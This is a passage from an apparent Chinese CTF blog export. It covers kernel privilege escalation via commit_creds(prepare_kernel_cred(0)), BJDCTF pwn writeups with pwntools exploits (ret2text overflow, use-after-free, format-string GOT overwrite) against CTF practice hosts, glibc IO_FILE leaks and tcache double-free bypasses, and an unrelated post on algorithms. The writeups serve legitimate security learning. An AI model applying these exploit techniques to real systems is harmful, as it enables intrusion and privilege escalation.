gid; /* real GID of the task */ kuid_t suid; /* saved UID of the task */ kgid_t sgid; /* saved GID of the task */ kuid_t euid; /* effective UID of the task */ kgid_t egid; /* effective GID of the task */ kuid_t fsuid; /* UID for VFS ops */ kgid_t fsgid; /* GID for VFS ops */ unsigned securebits; /* SUID-less security management */ kernel_cap_t cap_inheritable; /* caps our children can inherit */ kernel_cap_t cap_permitted; /* caps we're permitted */ kernel_cap_t cap_effective; /* caps we can actually use */ kernel_cap_t cap_bset; /* capability bounding set */ kernel_cap_t cap_ambient; /* Ambient capability set */#ifdef CONFIG_KEYS unsigned char jit_keyring; /* default keyring to attach requested * keys to */ struct key __rcu *session_keyring; /* keyring inherited over fork */ struct key *process_keyring; /* keyring private to this process */ struct key *thread_keyring; /* keyring private to this thread */ struct key *request_key_auth; /* assumed request_key authority */#endif#ifdef CONFIG_SECURITY void *security; /* subjective LSM security */#endif struct user_struct *user; /* real user ID subscription */ struct user_namespace *user_ns; /* user_ns the caps and keyrings are relative to. */ struct group_info *group_info; /* supplementary groups for euid/fsgid */ struct rcu_head rcu; /* RCU deletion hook */&#125; __randomize_layout; 5 内核态函数相比用户态库函数，内核态的函数有了一些变化 printf() -&gt; printk()，但需要注意的是 printk() 不一定会把内容显示到终端上，但一定在内核缓冲区里，可以通过 dmesg 查看效果 memcpy() -&gt;copy_from_user()/copy_to_user() copy_from_user() 实现了将用户空间的数据传送到内核空间 copy_to_user() 实现了将内核空间的数据传送到用户空间 malloc() -&gt; kmalloc()，内核态的内存分配函数，和 malloc() 相似，但使用的是 slab/slub 分配器 free() -&gt; kfree()，同 kmalloc() 另外要注意的是，kernel 管理进程，因此 kernel 也记录了进程的权限。kernel 中有两个可以方便的改变权限的函数： int commit_creds(struct cred *new) struct cred* prepare_kernel_cred(struct task_struct* daemon) 从函数名也可以看出，执行 commit_creds(prepare_kernel_cred(0)) 即可获得 root 权限（root 的 uid，gid 均为 0） 执行 commit_creds(prepare_kernel_cred(0)) 也是最常用的提权手段，两个函数的地址都可以在 /proc/kallsyms 中查看（较老的内核版本中是 /proc/ksyms。 123456789post sudo grep commit_creds /proc/kallsyms [sudo] m4x 的密码：ffffffffbb6af9e0 T commit_credsffffffffbc7cb3d0 r __ksymtab_commit_credsffffffffbc7f06fe r __kstrtab_commit_credspost sudo grep prepare_kernel_cred /proc/kallsymsffffffffbb6afd90 T prepare_kernel_credffffffffbc7d4f20 r __ksymtab_prepare_kernel_credffffffffbc7f06b7 r __kstrtab_prepare_kernel_cred 6 Ctf kernel Pwn 相关一般会给以下三个文件 boot.sh: 一个用于启动 kernel 的 shell 的脚本，多用 qemu，保护措施与 qemu 不同的启动参数有关 bzImage: kernel binary rootfs.cpio: 文件系统映像 比如： 123456789101112131415161718192021222324CISCN2017_babydriver [master●] lsbabydriver.tarCISCN2017_babydriver [master●] x babydriver.tarboot.shbzImagerootfs.cpioCISCN2017_babydriver [master●] lsbabydriver.tar boot.sh bzImage rootfs.cpioCISCN2017_babydriver [master●] file bzImagebzImage: Linux kernel x86 boot executable bzImage, version 4.4.72 (atum@ubuntu) #1 SMP Thu Jun 15 19:52:50 PDT 2017, RO-rootFS, swap_dev 0x6, Normal VGACISCN2017_babydriver [master●] file rootfs.cpiorootfs.cpio: gzip compressed data, last modified: Tue Jul 4 08:39:15 2017, max compression, from Unix, original size 2844672CISCN2017_babydriver [master●] file boot.shboot.sh: Bourne-Again shell script, ASCII text executableCISCN2017_babydriver [master●] bat boot.sh ───────┬───────────────────────────────────────────────────────────────────────────────── │ File: boot.sh───────┼───────────────────────────────────────────────────────────────────────────────── 1 │ #!/bin/bash 2 │ 3 │ qemu-system-x86_64 -initrd rootfs.cpio -kernel bzImage -append 'console=ttyS0 ro │ ot=/dev/ram oops=panic panic=1' -enable-kvm -monitor /dev/null -m 64M --nographi │ c -smp cores=1,threads=1 -cpu kvm64,+smep───────┴───────────────────────────────────────────────────────────────────────────────── 解释一下 qemu 启动的参数： -initrd rootfs.cpio，使用 rootfs.cpio 作为内核启动的文件系统 -kernel bzImage，使用 bzImage 作为 kernel 映像 -cpu kvm64,+smep，设置 CPU 的安全选项，这里开启了 smep -m 64M，设置虚拟 RAM 为 64M，默认为 128M 其他的选项可以通过 –help 查看。 本地写好 exploit 后，可以通过 base64 编码等方式把编译好的二进制文件保存到远程目录下，进而拿到 flag 5 常用指令解包 1cpio -idmv &lt; rootfs.cpio 打包 1find . | cpio -o --format=newc &gt; ../core.cpio 编译 1gcc exp.c -static -masm=intel -g -o exp 查看text段地址 1cat /sys/module/core/sections/.text","tags":[{"name":"内核","slug":"内核","permalink":"wood1314.github.io/tags/内核/"}]},{"title":"BJDCTF-writeup","date":"2020-03-22T10:40:13.000Z","path":"year/03/22/cl6ewld8k0008j63f3m5ea052/","text":"BJDCTF的writeup，前几道题目都比较友好。 1 one_gadget1.1 题目分析点开init函数，里面有一个泄露了printf的地址,是这个题目给的额外条件吧。 再看题目可知我们输入了一个地址，然后就直接执行那个地址就可以getshell，是不是很厉害，这就是one_gadget. 1.2 关于one_gadget 更详细的介绍one-gadget 是glibc里调用execve(&#39;/bin/sh&#39;, NULL, NULL)的一段非常有用的gadget。在我们能够控制ip（也就是pc）的时候，用one-gadget来做RCE（远程代码执行）非常方便，比如有时候我们能够做一个任意函数执行，但是做不到控制第一个参数，这样就没办法调用system(&quot;sh&quot;)，这个时候one gadget就可以搞定了。 我们一般用one_gadget这个工具来寻找这样的gadget。 1.3 如何利用工具寻找one_gadget 如果远程的libc版本和你本地一样，或者你想在本地试验时,先用ldd 文件名命令找到自己本地的libc目录 然后再用刚才安装好的工具查看libc文件就可以找到one_gadget对于libc的偏移了。 如果题目给你了它远程的libc文件的话,直接对那个libc文件使用就行 1.4 对于one_gadget的一点经验 那个红色constraints就是调用这个gadget需要满足的条件,一般64位的很好满足，32位的基本用不了。 一个用不了可以多试几个后面的。 前期栈题可能用到的不多，后面堆题经常用来作为劫持malloc_hook的内容，也可以配合realloc_hook来调整栈环境使得满足one_gadget的利用条件。1.5 exp123456789101112from pwn import *context.log_level = 'debug'#sh = process('./one_gadget')libc = ELF('./libc-2.29.so')sh = remote(\"node3.buuoj.cn\",27231)sh.recvuntil(\"here is the gift for u:\")#gdb.attach(sh)libc_base = int(sh.recvuntil('\\n')[:-1],16) - libc.symbols['printf']log.success('libc_addr: ' + hex(libc_base))one_gadget = libc_base +0x106ef8sh.sendline(str(one_gadget))sh.interactive() 2 r2t32.1题目分析12345678910111213141516171819202122232425262728293031int __cdecl main(int argc, const char **argv, const char **envp)&#123; char buf; // [esp+0h] [ebp-408h] my_init(); puts(\"**********************************\"); puts(\"* Welcome to the BJDCTF! *\"); puts(\"[+]Ret2text3.0?\"); puts(\"[+]Please input your name:\"); read(0, &amp;buf, 0x400u); name_check(&amp;buf); puts(\"Welcome ,u win!\"); return 0;&#125;``` `read`了0x400大小，但是并没有溢出,再让我们看下这个`name_check````Cchar *__cdecl name_check(char *s)&#123; char dest; // [esp+7h] [ebp-11h] unsigned __int8 v3; // [esp+Fh] [ebp-9h] v3 = strlen(s); if ( v3 &lt;= 3u || v3 &gt; 8u ) &#123; puts(\"Oops,u name is too long!\"); exit(-1); &#125; printf(\"Hello,My dear %s\", s); return strcpy(&amp;dest, s);&#125; 读入的长度只要小于3或者大于8都会直接将程序结束，看起来好像没有漏洞，但是注意这个v3是个__int8的，也就是只有一个字节，只要我们的长度足够大，就可以将这个长度溢出到我们需要的范围，进而在strcpy的时候构成栈溢出 123456789101112from pwn import *#sh = process('./r2t3')sh = remote('node3.buuoj.cn',29481)door = 0x804858Bpayload = 'a'*0x15payload += p32(door)payload += 'a'*237sh.recvuntil(\"[+]Please input your name:\\n\")#gdb.attach(sh)sh.sendline(payload)sh.interactive() 3 girlfriend这道题是个uaf，挺简单，刚学堆的可以做一下这个题熟悉一下堆题。 123456789101112131415161718192021222324252627282930313233from pwn import *#sh = process('./ydsneedgirlfriend2')sh = remote('node3.buuoj.cn',28207)context.log_level = 'debug'def add(size,content): sh.recvuntil(\"u choice :\\n\") sh.sendline('1') sh.recvuntil(\"Please input the length of her name:\\n\") sh.sendline(str(size)) sh.recvuntil(\"Please tell me her name:\\n\") sh.send(content)def dele(idx): sh.recvuntil(\"u choice :\\n\") sh.sendline('2') sh.recvuntil(\"Index :\") sh.sendline(str(idx))door = 0x400D86#gdb.attach(sh)add(0x10,'a'*0x10)#dele(1)#dele(1)dele(0)add(0x10,'a'*0x8+p64(door))sh.recvuntil(\"u choice :\\n\")sh.sendline('3')sh.recvuntil(\"Index :\")sh.sendline('0')#add(0x10,'a'*0x8+p64(door))sh.interactive() 4 r2t4一道格式化字符串题目 4.1题目分析12345678910int __cdecl main(int argc, const char **argv, const char **envp)&#123; char buf; // [rsp+0h] [rbp-30h] unsigned __int64 v5; // [rsp+28h] [rbp-8h] v5 = __readfsqword(0x28u); read(0, &amp;buf, 0x38uLL); printf(&amp;buf, &amp;buf); return 0;&#125; 这里的buf可以直接溢出，有后门函数，但是开启了canary保护。 直接把后门函数的地址写到其它函数的got表里行不通，因为后面没有别的函数调用了 注意到我们触发canary的话也会输出一个stack smashing detect ***这种东西 1234void __attribute__ ((noreturn)) __stack_chk_fail (void)&#123; __fortify_fail (\"stack smashing detected\");&#125; 其实就是上面这个函数，我们可以通过劫持这个函数的got来拿shell 4.2 exp123456789101112131415161718from pwn import *context.log_level = 'debug'#sh = process('./r2t4')sh = remote('node3.buuoj.cn',26917)fini = 0x600E18door = 0x400626stack_ch = 0x601018index = 8payload = 'bbbbb'payload += '%' + str(0x626-5) +'c'payload += '%' + str(index) + '$hn'payload += p64(stack_ch)payload += 'a'*0x20#gdb.attach(sh)sh.send(payload)sh.interactive() 5 test用od ????来读flag就行,还有类似*这样的通配符，很神奇 123456789101112131415161718import binasciifrom pwn import *asc = '''066146 063541 032173 061067 031143 031067 026461 062470034146 032055 033146 026463 062142 031462 061055 031544062142 030467 061542 060544 076470'''flag = ''for i in range(1,len(asc),7): a = asc[i:i+6] log.info('a = ' + a) num = int(a,8) h = hex(num)[2:] s = binascii.a2b_hex(h) s = s[::-1] log.info(s) flag += s log.success(flag) 6 secret有一个buf那个地方可以溢出到后面的一个变量，在后面每次执行的时候那个变量指向的内容都会减一，所以可以把这个地方溢出成printf的got表,手动过16次就ok了 1234567from pwn import *#sh = process('./secret')sh = remote('node3.buuoj.cn',27147)sh.recvuntil(\" What's your name? ________________ #\")payload = '/bin/sh\\x00' + p64(0) +'\\x40\\xd0\\x46'sh.sendline(payload)sh.interactive()","tags":[{"name":"writeup","slug":"writeup","permalink":"wood1314.github.io/tags/writeup/"}]},{"title":"IO_FILE leak","date":"2020-03-15T13:05:23.000Z","path":"year/03/15/cl6ewld8u000oj63fqj8p0djk/","text":"上次比赛出了个house of roman思路的题，结果发现这个利用方式已经落后于时代了,当大家纷纷把这题秒了的时候，我顿时对自己产生了怀疑。所以记录一下。。。。 其实主要思路就是修改stdout的flag位为0xfbad1800,并且将_IO_write_base的最后一个字节改小，从而实现多输出一些内容，这些内容里面就包含了libc地址。 stdout泄露为什么flag要改成0xfbad1800，看源码： puts函数在源码中是由_IO_puts实现的，而_IO_puts函数内部会调用_IO_sputn，结果会执行_IO_new_file_xsputn，最终会执行_IO_overflow 12345678910111213141516171819202122232425262728int _IO_new_file_overflow (_IO_FILE *f, int ch) &#123; if (f-&gt;_flags &amp; _IO_NO_WRITES) /* SET ERROR */ &#123;//避免进入 f-&gt;_flags |= _IO_ERR_SEEN; __set_errno (EBADF); return EOF; &#125; /* If currently reading or no buffer allocated. */ if ((f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING) == 0 || f-&gt;_IO_write_base == NULL)&#123; ......//避免进入 ...... &#125; if (ch == EOF) return _IO_do_write (f, f-&gt;_IO_write_base, f-&gt;_IO_write_ptr - f-&gt;_IO_write_base); //进入目标 if (f-&gt;_IO_write_ptr == f-&gt;_IO_buf_end ) /* Buffer is really full */ if (_IO_do_flush (f) == EOF) return EOF; *f-&gt;_IO_write_ptr++ = ch; if ((f-&gt;_flags &amp; _IO_UNBUFFERED) || ((f-&gt;_flags &amp; _IO_LINE_BUF) &amp;&amp; ch == '\\n')) if (_IO_do_write (f, f-&gt;_IO_write_base, f-&gt;_IO_write_ptr - f-&gt;_IO_write_base) == EOF) return EOF; return (unsigned char) ch; &#125; 可以看到_IO_do_write是最后调用的函数，而_IO_write_base是我们要修改的目标。 这里f-&gt;_flag &amp; _IO_NO_WRITES的值应该为0，为了不进入第一个if分支 同时使f-&gt;_flag &amp;_IO_CURRENTLY_PUTTING的值为1，为了不进入第二个if分支 _IO_do_write函数的参数为：stdout结构体、_IO_write_base和size(由f-&gt;_IO_write_ptr - f-&gt;_IO_write_base决定)，而_IO_do_write实际会调用new_do_write，参数一样。 12345678910111213141516171819202122static_IO_size_tnew_do_write (_IO_FILE *fp, const char *data, _IO_size_t to_do)&#123; ... _IO_size_t count; if (fp-&gt;_flags &amp; _IO_IS_APPENDING) fp-&gt;_offset = _IO_pos_BAD; else if (fp-&gt;_IO_read_end != fp-&gt;_IO_write_base) &#123; _IO_off64_t new_pos = _IO_SYSSEEK (fp, fp-&gt;_IO_write_base - fp-&gt;_IO_read_end, 1); if (new_pos == _IO_pos_BAD) return 0; fp-&gt;_offset = new_pos; &#125; // 调用函数输出输出缓冲区 count = _IO_SYSWRITE (fp, data, to_do); //最终输出 ... return count;&#125; 这里，_IO_SYSWRITE就是我们的目标，这相当于write(fp,data,to_do)。 _IO_SYSSEEK只是简单的调用lseek，但是我们不能完全控制fp-&gt;_IO_write_base - fp-&gt;_IO_read_end的值，如果fp-&gt;_IO_read_end的值设置为0，那么_IO_SYSSEEK的第二个参数值就会过大，如果设置fp-&gt;_IO_write_base = fp-&gt;_IO_read_end的话，那么在其它地方就会有问题，因为fp-&gt;_IO_write_base 不能大于 fp-&gt;_IO_write_end。所以这里要设置fp-&gt;_flags | _IO_IS_APPENDING，避免进入else if 分支。 最终需要构造的fp-flags是这样的，才能绕过上面提到的分支。 1234_flags = 0xfbad0000 _flags &amp;= ~_IO_NO_WRITES ## _flags = 0xfbad0000 _flags |= _IO_CURRENTLY_PUTTING ## _flags = 0xfbad0800_flags |= _IO_IS_APPENDING ## _flags = 0xfbad1800 所以通常将stdout的flags修改成0xfbad1800，将_IO_write_base改小，就可以造成libc的泄漏。","tags":[{"name":"堆","slug":"堆","permalink":"wood1314.github.io/tags/堆/"},{"name":"IO_FILE","slug":"IO-FILE","permalink":"wood1314.github.io/tags/IO-FILE/"},{"name":"leak","slug":"leak","permalink":"wood1314.github.io/tags/leak/"},{"name":"tcache","slug":"tcache","permalink":"wood1314.github.io/tags/tcache/"}]},{"title":"算法设计与分析","date":"2020-03-14T12:56:45.000Z","path":"year/03/14/cl6ewldbj005wj63f5cvgkzzm/","text":"课上所学，课下实现，顺便学下Java 1 归并排序1.1 自顶向下的归并排序如果它能够将两个子数组排序，他就能通过归并两个子数组来将整个数组排序。 12345678910111213141516171819202122232425262728293031323334public class Merge &#123; private static Comparable[] aux; //归并排序需要的数组 public static void sort(Comparable[] a) &#123; aux = new Comparable[a.length]; sort(a, 0, a.length-1); &#125; public static void sort(Comparable[] a, int lo, int hi) &#123; if(hi &lt;= lo) return; int mid = lo + (hi - lo)/2; sort(a, lo, mid); sort(a, mid+1, hi); merge(a, lo, mid, hi); &#125; public static void merge(Comparable[] a, int lo, int mid,int hi) &#123;//将a[lo..mid] 和 a[mid+1..hi]归并 int i = lo, j = mid + 1; for (int k = lo; k&lt;=hi; k++) //将a[lo..hi]复制到aux[lo..hi] aux[k] = a[k]; for (int k = lo; k&lt;=hi; k++) //归并 if(i &gt; mid) a[k] = aux[j++]; else if(j &gt; hi) a[k] = aux[i++]; else if(less(aux[i],aux[j])) a[k] = aux[i++]; else a[k] = aux[j++]; &#125; private static boolean less(Comparable v, Comparable w) &#123; return v.compareTo(w) &lt; 0; &#125;&#125; 1.11 对小规模子数组使用插入排序因为递归会使小规模问题中的递归调用过于频繁，所以改进对他们的处理就能改进整个算法。插入排序很可能在小数组上比归并排序更快。 1.12 测试数组是否已经有序添加一个判断条件，如果a[mid]小于等于a[mid+1]，我们就认为数组是已经有序的，并跳过merge()方法。 1.13 将不重复元素复制到数组1.2 自底向上的归并排序这个merge的地方很巧妙,感觉这种写法更清晰一点，下面那种用while的我自己都快把自己绕晕了 123456789101112131415161718192021222324252627public class MergeBU &#123; private static boolean less(Comparable v, Comparable w) &#123; return v.compareTo(w) &lt; 0; &#125; private static Comparable[] aux; public static void sort(Comparable[] a) &#123;//进行logN次两两归并 int N = a.length; aux = new Comparable[N]; for(int sz = 1; sz &lt;N; sz = sz + sz) //sz子数组大小 for(int lo = 0; lo &lt; N-sz; lo += sz + sz)// lo:子数组索引 merge(a, lo, lo + sz-1, Math.min(lo+sz+sz-1, N-1)); &#125; public static void merge(Comparable[] a, int lo, int mid,int hi) &#123;//将a[lo..mid] 和 a[mid+1..hi]归并 int i = lo, j = mid + 1; for (int k = lo; k&lt;=hi; k++) //将a[lo..hi]复制到aux[lo..hi] aux[k] = a[k]; for (int k = lo; k&lt;=hi; k++) //归并 if(i &gt; mid) a[k] = aux[j++]; else if(j &gt; hi) a[k] = aux[i++]; else if(less(aux[i],aux[j])) a[k] = aux[i++]; else a[k] = aux[j++]; &#125;&#125; 自己用C写的 1234567891011121314151617181920212223242526272829303132333435363738394041424344void Merge(int *A,int start,int mid, int end)&#123; int B[end - start + 1] = &#123;0&#125;; int s = start, t = mid+1, k = start; while(s &lt;= mid &amp;&amp; t&lt;=end)&#123; if(A[s] &lt;= A[t]) B[k++ - start] = A[s++]; //这里这个 -start坑了我好长时间 else B[k++ - start] = A[t++]; &#125; int j = k; //这里是个优化,可以减少赋值次数 while(s &lt;= mid) A[j++] = A[s++]; for(int i=start; i&lt;=k-1; i++) A[i] = B[i - start]; return;&#125;void BottomupSort(int *A, int n)&#123; int t = 1; while(t&lt;=n)&#123; int s ,i; i = 0; s = t; t = s*2; while(i + t &lt;=n)&#123; Merge(A,i,i+s-1,i+t-1); i = i+t; &#125; if(i+s &lt; n)&#123; Merge(A,i,i+s-1,n-1); &#125; &#125;&#125;int main()&#123; int A[10] = &#123;4,1,7,5,8,2,6,3,10,9&#125;; BottomupSort(A,10); for(int i=0; i&lt;=9; i++) printf(\"%d \",A[i]); return 0; &#125; 2 堆实现的优先队列1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556package com.company;import java.util.EmptyStackException;public class MaxPQ&lt;Key extends Comparable&lt;Key&gt;&gt; &#123; private Key[] pq; //基于堆的完全二叉树 private int N = 0; //存储于pq[1...N]，pq[0]并没有使用 public MaxPQ(int maxN) &#123; pq = (Key[]) new Comparable[maxN + 1]; &#125; public boolean isEmpty() &#123; return N == 0; &#125; public int size() &#123; return N; &#125; public void insert(Key v) &#123; pq[++N] = v; swim(N); &#125; public Key delMax() &#123; Key max = pq[1]; //从根节点得到最大元素 exch(1,N--); //将其和最后一个元素交换 pq[N+1] = null; //防止对象游离 sink(1); //恢复堆上的有序性 return max; &#125; private boolean less(int i, int j) &#123; return pq[i].compareTo(pq[j]) &lt; 0; &#125; private void exch(int i, int j) &#123; Key t = pq[i]; pq[i] = pq[j]; pq[j] = t;&#125; private void swim(int k) //上浮 &#123; while( k &gt; 1 &amp;&amp; less(k/2, k)) &#123; exch(k/2, k); k = k/2; &#125; &#125; private void sink(int k) //下沉 &#123; while(2*k &lt;= N) &#123; int j = 2*k; if(j &lt; N &amp;&amp; less(j, j+1)) j++; if(!less(k, j)) break; exch(k,j); k = j; &#125; &#125;&#125; 3 快速幂思路类似于多项式求和 123456789101112int pow2(int i, int j)&#123; int result = 1, n, s = i; while(j)&#123; n = j%2; j = j/2; if(n == 1) result *= s; s *= s; &#125; return result;&#125; 4 求多数元素在原序列中去除两个不同的元素以后，原序列中的多数元素在新的序列中还是多数元素O(n)的时间复杂度 12345678910111213141516int majorityElement(int *a,int len)&#123; int count = 1; int maj = a[0]; for(int i=1; i&lt;len; i++)&#123; if(maj == a[i]) count++; else&#123; count--; if(count == 0)&#123; maj = a[i+1]; &#125; &#125; &#125; return maj;&#125; 5分治5.1 求最大最小值123456789101112131415161718192021222324252627282930/*寻找最小值需要进行n-1次比较，这已经是最优结果。如果需要同时找出最大值和最小值，可以直接进行两次查询，一次最大值一次最小值，共需要2(n-1)次比较。而事实上，我们可以只通过3*[n/2]次比较就足以同时找到最大值和最小值。通过成对的处理元素，先将一对输入元素比较，找到较大值和较小值。然后将较大值与当前最大值比较，较小值与当前最小值比较，这样每两个元素需要比较3次，一共需要3*[n/2]次比较。*/void max_min(int a[], int l, int r, int &amp;minValue, int &amp;maxValue)&#123; if (l == r) &#123;// l 与 r之间只有一个元素 minValue = maxValue = a[l]; return; &#125; if (l + 1 == r)&#123; // l 与 r 之间只有两个元素 if(a[l] &gt; a[r])&#123; minValue = a[r]; maxValue = a[l]; &#125; else&#123; minValue = a[l]; maxValue = a[r]; &#125; return; &#125; int lmax, lmin; int m = (l + r)/2; max_min(a, l, m, lmin, lmax); //找出左边最大值和最小值 int rmax ,rmin; max_min(a, m+1, r, rmin, rmax); // 找出右边最大值和最小值 maxValue = max(lmax, rmax); minValue = min(lmin, rmin); &#125; 5.2 求第k小元素123456789101112131415161718192021222324252627282930313233343536373839404142//划分——每次划分唯一确定一个元素位置int partition(int A[], int low, int high)&#123; int pivot = A[low]; while(low &lt; high)&#123; while(low &lt; high &amp;&amp; A[high] &gt;= pivot)&#123; --high; &#125; A[low] = A[high]; //将比基准小的元素移动到左端 while(low &lt; high &amp;&amp; A[low] &lt;= pivot)&#123; ++low; &#125; A[high] = A[low]; &#125; A[low] = pivot; return low;&#125;int r = 5;int select_rank_k(int A[], int low, int high, int k)&#123; int r_group = ceil((high - low + 1) * 1.0 / r); //ceil 取上限共分为r_group个组 //计算每个分组中值，存于A[]最前面 for (int i = 1; i &lt;= r_group; ++i)&#123; sort(&amp;A[low + (i - 1)*r], &amp;A[(low + i*r -1) &gt; high ? high: (low + i*r - 1)]); swap(A[low + i - 1], A[low + (i-1)*r + r/2]); &#125; //获得每个组的中值的中值（并置于A[low]位置，方便调用快排划分函数) sort(&amp;A[low], &amp;A[low + r_group]); swap(A[low], A[low + r_group /2]); int cur = partition(A, low, high); if( cur == k-1)&#123; return A[cur]; &#125; else if ( cur &lt; k)&#123; return select_rank_k(A, cur + 1, high, k); &#125; else &#123; return select_rank_k(A, low, cur - 1, k); &#125;&#125; 6 动态规划6.1 求最长子序列123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051#include&lt;stdio.h&gt;#include &lt;string.h&gt;#include &lt;algorithm&gt;#define MAXLEN 50using namespace std;void LCSLength(char *x, char *y, int m, int n, int c[][MAXLEN])&#123; for(int i=0; i&lt;=m; i++) c[i][0] = 0; for(int i=0; i&lt;=n; i++) c[0][i] = 0; for(int i=1; i&lt;=m; i++)&#123; for(int j=1; j&lt;=n; j++)&#123; if(x[i-1] == y[j-1])&#123; c[i][j] = c[i-1][j-1] + 1; &#125; else&#123; c[i][j] = max(c[i-1][j],c[i][j-1]); &#125; &#125; &#125; return; &#125;void printLCS(int c[][MAXLEN], int i, int j,char *x)&#123; char s[MAXLEN]; int k = c[i][j]; s[k] = '\\0'; while(k&gt;0)&#123; if(c[i][j] == c[i-1][j]) i--; else if (c[i][j] == c[i][j-1]) j--; else&#123; s[--k] = x[i-1]; i--; j--; &#125; &#125; printf(\"%s\",s);&#125;int main() &#123; char x[MAXLEN] = &#123;\"ABCBDAB\"&#125;; char y[MAXLEN] = &#123;\"BDCABA\"&#125;; int c[MAXLEN][MAXLEN]; int m = strlen(x); int n = strlen(y); LCSLength(x,y,m,n,c); printf(\"%d\\n\",c[m][n]); printLCS(c, m, n, x); return 0;&#125; 6.2 背包问题问题描述：有N件物品和一个容量为V的背包。第i件物品的费用是c[i]，价值是w[i]。求解将哪些物品装入背包可使价值总和最大。 基本思路 ：这是最基础的背包问题，特点是：每种物品仅有一件，可以选择放或不放。 用子问题定义状态：即f[i][v]表示前i件物品恰放入一个容量为v的背包可以获得的最大价值。则其状态转移方程便是： 代码如下 12345678for(int i = 1; i &lt;= n; i++) &#123; for(int j = 0; j &lt;= W; j++) &#123; if(j &lt; w[i]) dp[i][j] = dp[i-1][j]; else dp[i][j] = max(dp[i-1][j], dp[i-1][j - w[i]] + v[i]); &#125; &#125; 优化空间复杂度：以上方法的时间和空间复杂度均为O(VN)，其中时间复杂度应该已经不能再优化了，但空间复杂度却可以优化到O(V) 只用一维数组的话要注意到，每次他都会利用上一行左边的值，那么我们只要每行从右向左遍历，那么就不会覆盖到原来的值了。 12345for(int i = 1; i &lt;= n; i++)&#123; for(int j = W; j &gt;= w[i]; j--) dp[j] = max(dp[j], dp[j - w[i] + v[i]);&#125;","tags":[{"name":"算法","slug":"算法","permalink":"wood1314.github.io/tags/算法/"}]},{"title":"libc2.29利用小结","date":"2020-03-04T11:38:03.000Z","path":"year/03/04/cl6ewlda3002gj63fw84zfaro/","text":"0x0简介libc2.29的题目又与2.27的机制有所不同这里总结下 0x1 新增机制tcache是glibc-2.26引入的一种新技术，目的是提升堆管理的性能，早期的libc对tcache基本没任何防护，简直到了为所欲为的地步，一不检查double free，二不检查size大小，使用起来比fastbins还要简单。 查看glibc-2.29 malloc.c的源码，tcache_entry结构体增加了一个新指针key放在bk的位置，用于检测double free。 123456typedef struct tcache_entry&#123; struct tcache_entry *next; /* This field exists to detect double frees. */ struct tcache_perthread_struct *key; /* 新增指针 */&#125; tcache_entry; 在之前的版本，要填满tcache非常简单粗暴，如果程序不清空指针，可以由头到尾free同一个chunk，直接把tcache填满，在2.29下这个方法不再适用。下面继续看一下tcache_put和tcache_get部分的源码，看看这个新指针起到如何的作用。 12345678910111213141516171819202122232425262728/* Caller must ensure that we know tc_idx is valid and there's room for more chunks. */static __always_inline voidtcache_put (mchunkptr chunk, size_t tc_idx)&#123; tcache_entry *e = (tcache_entry *) chunk2mem (chunk); assert (tc_idx &lt; TCACHE_MAX_BINS); /* Mark this chunk as \"in the tcache\" so the test in _int_free will detect a double free. */ e-&gt;key = tcache; // 写入tcache_perthread_struct地址 e-&gt;next = tcache-&gt;entries[tc_idx]; tcache-&gt;entries[tc_idx] = e; ++(tcache-&gt;counts[tc_idx]);&#125;/* Caller must ensure that we know tc_idx is valid and there's available chunks to remove. */static __always_inline void *tcache_get (size_t tc_idx)&#123; tcache_entry *e = tcache-&gt;entries[tc_idx]; assert (tc_idx &lt; TCACHE_MAX_BINS); assert (tcache-&gt;counts[tc_idx] &gt; 0); tcache-&gt;entries[tc_idx] = e-&gt;next; --(tcache-&gt;counts[tc_idx]); e-&gt;key = NULL; // 清空 return (void *) e;&#125; 当一个属于tcache大小的chunk被free掉时，会调用tcache_put，e-&gt;key被写入tcache_perthread_struct的地址，也就是heap开头的位置。而当程序从tcache取出chunk时，会将e-&gt;key重新清空。 然后再看一下_int_free中tcache部分如何进行double free检测。 123456789101112131415161718192021222324252627282930313233343536373839static void_int_free (mstate av, mchunkptr p, int have_lock)&#123; INTERNAL_SIZE_T size; /* its size */ mfastbinptr *fb; /* associated fastbin */ mchunkptr nextchunk; /* next contiguous chunk */ INTERNAL_SIZE_T nextsize; /* its size */ int nextinuse; /* true if nextchunk is used */ INTERNAL_SIZE_T prevsize; /* size of previous contiguous chunk */ mchunkptr bck; /* misc temp for linking */ mchunkptr fwd; /* misc temp for linking */ ...#if USE_TCACHE &#123; size_t tc_idx = csize2tidx (size); if (tcache != NULL &amp;&amp; tc_idx &lt; mp_.tcache_bins) &#123; /* Check to see if it's already in the tcache. */ tcache_entry *e = (tcache_entry *) chunk2mem (p); /* This test succeeds on double free. However, we don't 100% trust it (it also matches random payload data at a 1 in 2^&lt;size_t&gt; chance), so verify it's not an unlikely coincidence before aborting. */ if (__glibc_unlikely (e-&gt;key == tcache)) // 检查是否为tcache_perthread_struct地址 &#123; tcache_entry *tmp; LIBC_PROBE (memory_tcache_double_free, 2, e, tc_idx); for (tmp = tcache-&gt;entries[tc_idx]; tmp; tmp = tmp-&gt;next) if (tmp == e) // 检查tcache中是否有一样的chunk malloc_printerr (\"free(): double free detected in tcache 2\"); /* If we get here, it was a coincidence. We've wasted a few cycles, but don't abort. */ &#125; ... 首先_int_free会检查chunk的key是否为tcache_perthread_struct地址，然后会遍历tcache，检查此chunk是否已经在tcache中，如有则触发malloc_printerr报错free(): double free detected in tcache 2。 简单总结一下，2.29下tcache触发double free报错的条件为： 1e-key == &amp;tcache_perthread_struct &amp;&amp; chunk in tcachebin[chunk_idx] 新增保护主要还是用到e-&gt;key这个属性，因此绕过想绕过检测进行double free，这里也是入手点。绕过思路有以下两个： 如果有UAF漏洞或堆溢出，可以修改e-&gt;key为空，或者其他非tcache_perthread_struct的地址。这样可以直接绕过_int_free里面第一个if判断。不过如果UAF或堆溢出能直接修改chunk的fd的话，根本就不需要用到double free了。 利用堆溢出，修改chunk的size，最差的情况至少要做到off by null。留意到_int_free里面判断当前chunk是否已存在tcache的地方，它是根据chunk的大小去查指定的tcache链，由于我们修改了chunk的size，查找tcache链时并不会找到该chunk，满足free的条件。虽然double free的chunk不在同一个tcache链中，不过不影响我们使用tcache poisoning进行攻击。 0x3 i春秋新春抗疫 Document(kn0ck)很明显的一个uaf，很好的利用了tcache的特性思路就是先填满tcache，然后再泄露，利用小块的0x8内的内容写到free_hook环境用的是现成的pwndocker，然后libc是用的glibc-all-in-one中下载的 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879from pwn import * context.log_level = 'debug' sh = process([\"./ld-2.29.so\", \"./pwn\"], 